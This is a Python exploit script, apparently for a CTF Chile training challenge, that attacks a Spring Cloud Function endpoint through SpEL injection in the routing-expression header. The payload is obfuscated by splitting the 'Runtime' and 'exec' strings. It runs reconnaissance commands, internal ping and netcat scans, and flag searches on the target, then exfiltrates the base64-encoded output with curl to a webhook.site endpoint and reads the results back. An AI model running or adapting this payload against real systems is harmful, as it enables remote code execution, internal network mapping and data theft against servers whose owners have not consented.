#!/usr/bin/env python3
"""
CTF Chile - Reconocimiento de red actual
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook para reconocimiento...")
uuid_resp = requests.post("https://webhook.site/token", timeout=10)
UUID = uuid_resp.json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def quick_probe(cmd, tag):
    shell = f"timeout 5 {cmd} | head -10 | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=10)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {str(e)[:50]}...")
        return False

print("\n[FASE 1] Información del sistema")
quick_probe("whoami && hostname && pwd", "system_info")
quick_probe("ip addr show", "network_interfaces")
quick_probe("route -n || ip route", "routing_table")

print("\n[FASE 2] Servicios locales")
quick_probe("netstat -tlnp || ss -tlnp", "local_ports")
quick_probe("ps aux | grep -v grep | head -10", "processes")

print("\n[FASE 3] Conectividad interna con timeout corto")
quick_probe("ping -c 2 10.160.209.1 || echo 'NO_PING_1'", "ping_service1")
quick_probe("ping -c 2 10.109.220.1 || echo 'NO_PING_2'", "ping_service2")

print("\n[FASE 4] Escaneo rápido de puertos")
quick_probe("nc -zv 10.160.209.1 8000 2>&1 || echo 'NO_NC_1'", "port_scan1")
quick_probe("nc -zv 10.109.220.1 8000 2>&1 || echo 'NO_NC_2'", "port_scan2")

print("\n[FASE 5] Buscar flags en ubicaciones obvias")
quick_probe("find /app -name '*flag*' -o -name '*ctf*' 2>/dev/null", "flag_files")
quick_probe("grep -r 'ctfchile{' /app /tmp /etc 2>/dev/null", "grep_flags")

print("\n[FASE 6] Información del JAR")
quick_probe("ls -la /app/", "app_directory")
quick_probe("file /app/* 2>/dev/null", "file_types")

print("\n⏰ Esperando resultados...")
time.sleep(8)

print(f"\n🔍 ANÁLISIS DE RESULTADOS...")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=15)
    data = r.json().get("data", [])

    network_info = {}
    flags_found = []
    services_found = []

    for req in data[:15]:
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("d", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")
                print(f"\n[{tag.upper()}]")
                print(decoded)

                # Buscar flags
                if "ctfchile{" in decoded.lower():
                    flags_found.append((tag, decoded))
                    print("🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

                # Analizar info de red
                if tag == "network_interfaces" and "inet" in decoded:
                    network_info["interfaces"] = decoded

                if tag.startswith("ping") and "received" in decoded:
                    services_found.append((tag, decoded))

                if tag.startswith("port_scan") and "open" in decoded:
                    services_found.append((tag, decoded))

            except Exception as e:
                print(f"\n[{tag}] (decode error): {raw_data[:100]}...")

    # Resumen
    print(f"\n{'='*60}")
    print(f"📊 RESUMEN DEL RECONOCIMIENTO")
    print(f"{'='*60}")

    if flags_found:
        print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
        for tag, flag in flags_found:
            print(f"    - {tag}: {flag}")

    if services_found:
        print(f"\n🔍 SERVICIOS DETECTADOS: {len(services_found)}")
        for tag, info in services_found:
            print(f"    - {tag}: {info.strip()}")

    if not flags_found and not services_found:
        print("💭 No se detectaron flags o servicios activos")
        print("🔄 Puede ser necesario cambiar la estrategia de ataque")

except Exception as e:
    print(f"[!] Error analizando resultados: {e}")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")
print("="*60)